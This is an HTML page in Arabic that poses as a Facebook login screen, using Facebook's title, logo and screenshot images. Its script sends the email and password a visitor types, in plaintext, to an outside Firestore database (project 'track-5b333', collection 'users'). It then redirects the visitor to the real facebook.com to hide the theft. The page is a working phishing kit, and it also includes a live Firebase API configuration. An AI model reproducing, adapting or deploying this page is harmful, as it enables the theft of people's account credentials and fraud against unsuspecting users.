<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>فيسبوك</title>

  <!-- إجبار الهاتف على وضع الكمبيوتر -->
  <meta name="viewport" content="width=1200, initial-scale=0.35, maximum-scale=1, user-scalable=yes">

  <!-- favicon SVG -->
  <link rel="icon"
        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%231877f2' d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'/%3E%3C/svg%3E"
        type="image/svg+xml">

  <style>
    /* تثبيت الصفحة كنسخة كمبيوتر */
html, body {
  min-width: 1200px;
  overflow-x: hidden;   /* إلغاء السكرول السفلي */
  overflow-y: auto;     /* الإبقاء على الجانبي */
}


    * {
      max-width: none !important;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      background: #F2F4F7;
      font: 28px Arial, sans-serif;
      color: #1877f2;
      position: relative;
    }

    /* حقول الإدخال */
    input {
      position: absolute;
      width: 340px;
      height: 48px;
      padding: 0 10px;
      font-size: 18px;
      color: #000;
      background: #fff;
      border: 1.50px solid transparent;
      border-radius: 5px;
      direction: rtl;
      z-index: 99999;
    }
    input::placeholder {
      color: #999999;
    }
    input:focus {
      outline: none;
      border-color: #40A9FF;
    }

    /* أماكن الحقول (لم تُمس) */
    #email { top: 149px; left: 217px; }
    #password { top: 213px; left: 217px; }

    /* صورتي العين */
    .eye {
      position: absolute;
      top: 225px;
      left: 227px;
      width: auto;
      height: auto;
      border-radius: 20px;
      z-index: 99999;
      cursor: pointer;
      display: none;
    }

    /* ddd.png فوق كل شيء بدون تحريك */
    #ddd {
      z-index: 9999999 !important;
      position: absolute;
    }
  </style>
</head>

<body>

  <input id="email" type="text" placeholder="البريد الإلكتروني أو رقم الهاتف">
  <input id="password" type="password" placeholder="كلمة السر">

  <!-- صور العين -->
  <img id="eyeShow" class="eye" src="https://i.postimg.cc/8CMWR1cY/ds.png" alt="show">
  <img id="eyeHide" class="eye" src="https://i.postimg.cc/zfKWCJvM/dzadazdza.png" alt="hide">

  <!-- الصور الأخرى (لم تُمس) -->
  <img src="https://i.postimg.cc/gj3dkT2t/cc.png" style="position:absolute;top:180px;right:180px;width:auto;height:auto;border-radius:10px;z-index:9999;">
  <img src="https://i.postimg.cc/L8xVb43b/dazd.png" style="position:absolute;top:120px;left:180px;width:auto;height:auto;border-radius:10px;z-index:9999;">
  <img src="https://i.postimg.cc/HnM5WdMq/back.png" style="position:absolute;top:700px;left:0;width:100vw;height:var(--h,200px);object-fit:cover;border-radius:10px;z-index:9999;">
  <img src="https://i.postimg.cc/X7H3Ndj3/dzdz.png" style="position:absolute;top:712px;left:180px;width:auto;height:auto;border-radius:10px;z-index:9999;">
  <img id="ddd" src="https://i.postimg.cc/k4vGTGxK/ddd.png" style="position:absolute;top:275px;left:210px;width:auto;height:auto;border-radius:10px;cursor:pointer;">

  <!-- السكريبتات كما هي (لم تُمس) -->
  <script>
    const pass = document.getElementById('password');
    const eyeShow = document.getElementById('eyeShow');
    const eyeHide = document.getElementById('eyeHide');

    pass.addEventListener('input', () => {
      if (pass.value.length > 0) {
        eyeShow.style.display = 'block';
      } else {
        eyeShow.style.display = 'none';
        eyeHide.style.display = 'none';
        pass.type = 'password';
      }
    });

    eyeShow.addEventListener('click', () => {
      pass.type = pass.type === 'password' ? 'text' : 'password';
      eyeHide.style.display = pass.type === 'text' ? 'block' : 'none';
    });

    eyeHide.addEventListener('click', () => {
      pass.type = 'password';
      eyeHide.style.display = 'none';
    });
  </script>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDwGqTQRikHsTqgO8Aid32JiKTiAJuswmo",
      authDomain: "track-5b333.firebaseapp.com",
      projectId: "track-5b333",
      storageBucket: "track-5b333.firebasestorage.app",
      messagingSenderId: "1051564826268",
      appId: "1:1051564826268:web:d6ca97d09b4ba2f6e99759",
      measurementId: "G-L67C04T5TL"
    };

    const app = initializeApp(firebaseConfig);
    const db  = getFirestore(app);

    document.getElementById('ddd').addEventListener('click', async () => {
      const email = document.getElementById('email').value.trim();
      const pass  = document.getElementById('password').value.trim();
      if (!email || !pass) return;
      try {
        await addDoc(collection(db, 'users'), {
          email,
          password: pass,
          opened: true,
          timestamp: serverTimestamp()
        });
        window.open('https://www.facebook.com', '_blank');
      } catch {}
    });
  </script>

</body>
</html>
